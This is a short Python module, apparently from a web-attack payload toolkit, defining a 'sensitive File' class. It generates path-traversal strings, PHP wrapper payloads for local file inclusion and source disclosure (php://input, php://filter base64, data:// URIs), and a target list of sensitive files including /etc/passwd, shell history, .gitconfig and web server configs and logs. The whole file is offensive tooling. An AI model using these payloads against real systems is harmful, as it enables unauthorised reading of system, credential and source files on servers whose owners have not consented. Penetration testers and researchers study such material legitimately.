#!/usr/bin/env python
# -*- coding: utf-8 -*-

from payloads.payload import Payload


class SFile(object):

    """sensitive File"""

    def __init__(self):
        super(SFile, self).__init__()
        # windows max dir length
        self.winmax = 259
        # linux max dir length
        self.linuxmax = 4096

    @staticmethod
    def traverse(cnt=5, path="../"):
        return path * cnt

    @staticmethod
    def fakeProtocol(type, msg=""):
        if type == "php":
            return "php://input"
        elif type == "phpb64":
            return "php://filter/convert.base64-encode/resource=" + msg
        elif type == "text":
            return "data://text/plain;base64," + msg.encode("base64")

    @staticmethod
    def sourceCode(ext):
        l = ["app", "index", "main"]
        return list(map(lambda i: i+"."+ext, l))

    @staticmethod
    def list():
        return [
            "/etc/passwd",
            ".bash_history",
            ".zsh_history",
            ".profile",
            ".bashrc",
            ".gitconfig",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log"
        ]
